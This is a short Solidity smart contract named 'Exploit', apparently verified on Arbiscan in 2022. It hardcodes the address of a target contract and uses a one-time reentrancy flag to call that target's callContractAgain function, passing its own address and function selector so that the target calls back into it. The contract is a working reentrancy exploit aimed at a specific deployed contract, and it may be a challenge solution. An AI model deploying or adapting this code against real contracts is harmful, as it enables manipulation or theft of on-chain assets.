/**
 *Submitted for verification at Arbiscan on 2022-08-06
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Exploit {
    uint256 public s_variable = 0;
    bool private reentered = false;
    address private vuln = 0x241F77325C073a3815985691f76B58dff17F685B;
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function doSomething() public {
        s_variable = 123;
    }

    function doSomethingAgain() public {
        if (!reentered) {
            reentered = true;
            vuln.call(
                abi.encodeWithSignature(
                    "callContractAgain(address,bytes4)",
                    address(this),
                    bytes4(keccak256("doSomethingAgain()"))
                )
            );
        }
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}
